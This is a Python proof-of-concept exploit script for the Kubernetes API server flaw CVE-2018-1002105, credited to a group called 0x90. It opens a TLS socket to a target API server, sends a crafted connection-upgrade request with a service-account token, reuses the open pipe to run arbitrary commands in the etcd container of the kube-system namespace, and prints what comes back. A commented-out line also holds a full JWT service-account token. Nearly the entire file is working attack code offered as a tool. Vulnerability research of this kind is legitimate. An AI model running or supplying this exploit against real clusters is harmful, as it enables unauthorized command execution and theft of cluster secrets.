#!/usr/bin/env python3
from secrets import base64, token_bytes
from ssl import wrap_socket
from socket import create_connection
import argparse
import art
import time
from time import sleep
from tqdm import tqdm
import os

width = os.get_terminal_size().columns

print("\n\n")
print("---------- PoC for CVE-2018-1002105 by group 0x90 ----------")

artwork = art.text2art("0x90",font='block',chr_ignore=True)
print(artwork)

print("---------- PoC for CVE-2018-1002105 by group 0x90 ----------\n\n")

def main():

    parser = argparse.ArgumentParser(description='PoC for CVE-2018-1002105 by group 0x90.')

    parser.add_argument('-t', dest='target', type=str,
                          help='API server target:port', required=True)
    parser.add_argument('-j', dest='token', type=str,
                          help='JWT token for service account', required=True)
    parser.add_argument('-n', dest='namespace', type=str,
                          help='Namespace with method access',
                          default='default')
    parser.add_argument('-p', dest='pod', type=str,
                          required=True, help='Pod with method access')
    parser.add_argument('-m', dest='method', choices=['exec',
                          'portforward', 'attach'], required=True)
    parser.add_argument('-c', dest='container', type=str,
                          help='Target container', default='etcd')
    parser.add_argument('-x', dest='command', type=str,
                          help='Command to execute',
                          default='grep')

    args = parser.parse_args()

    if args.target.find(':') == -1:
        print(f"please put in a valid target {args.target}")
        return False

    # connection upgrade request
    upgrade_req = " "
    upgrade_req_fd = open('upgrade_req', 'r')
    upgrade_req = upgrade_req_fd.read()
    
    #pod = "securenginx"
    #method = "attach"
    #target = "127.0.0.1:32774"
    #token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJwb2MiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoicG9jLXVzZXItdG9rZW4tdm5mcG0iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoicG9jLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJjMGFjNWM5ZC1iOTI4LTExZWMtODZiMS0wMjQyNGQwYjY4YTUiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6cG9jOnBvYy11c2VyIn0.YZNRrFSkT8KSKQSnOFRRncUDUzZI62eNflNvT8im6BUcE7pRHu6i5IdTfgXVWE0wqsc__xKfxuSkccaXMB-Zwd6O0Ofb0VvyWjLUw9W7TPoPzHCCpKUcdRf_op0tWxq1znHvg2VIAjmgyZmDtYXKwCQebFx_MiXhPFw7VYJkR894LZCQBEkxu9FukzZDDS6r-yQqfBC_nPBa9qMwnsf78Z6LGfyKACpbG23hA4gPe9udf98rjpyQdu1rFW9IY_I5_DPSTobyb0oSRCUrcA0w5GXAtBuRY9xSTBTUzjRo80ep5q8kRw2RfMs1MhZz4YZDYCBv7eHTRSuMfHs3TRWQWA"
    #command = 'whoami'
    #container = "etcd"
    
    upgraded_request= upgrade_req.format(args.namespace, args.pod, args.method, args.target, args.token).encode('utf-8')


    #exectuing attacker commands from the upgraded connection

    pnamespace="kube-system"
    ppod="etcd-minikube"


    command = f"command={'&command='.join(args.command.split(' '))}"
    #print(command)
    exec_cmds_fd = open('exec_cmds', 'r')
    exec_cmds = exec_cmds_fd.read()

    key = base64.b64encode(token_bytes(20)).decode('utf-8')

    cmd_exec = exec_cmds.format(pnamespace, ppod, args.container, command, args.target, key).encode('utf-8')
    #print(cmd_exec)

    exploitCode(args.target, upgraded_request, cmd_exec, args.method, ppod, args.container)
# exploit code block
def exploitCode(target, upgrade_conn, exec_conn, method, ppod, container):

    host, port = target.split(':')
    with create_connection((host, port)) as sock:

        with wrap_socket(sock) as ssock:
        
            ssock.send(upgrade_conn)
            
            for i in tqdm(range(10), desc =f"Building pipe using {method}"):
                sleep(0.1)

            if b'400 Bad Request' in ssock.recv(4096):
                print("\n")
                print('========= The pipe is opened =========\n\n')

            else:
                print("\n")
                print('x-x-x-x-x The pipe did not open x-x-x-x-x')

            
            ssock.send(exec_conn)
            
            #print("\n")
            for i in tqdm(range(10), desc=f"Attempting code exec on {ppod}/{container}"):
                sleep(0.1)

            if b'HTTP/1.1 101 Switching Protocols' not in ssock.recv(4096):
                print("\n\n")
                print('x-x-x-x-x The Exploit did not succeed x-x-x-x-x')

                return False

            else:
                print("\n")
                print('========= Attack is successful =========\n\n')
            data = []
            data_enter = True

            while data_enter:
                data_in = ssock.recv(4096)
                data.append(data_in)
        
                if not data_in:
                    data_enter = False
            
            print(''.join(msg.decode('unicode-escape')
                              for msg in data))



main()
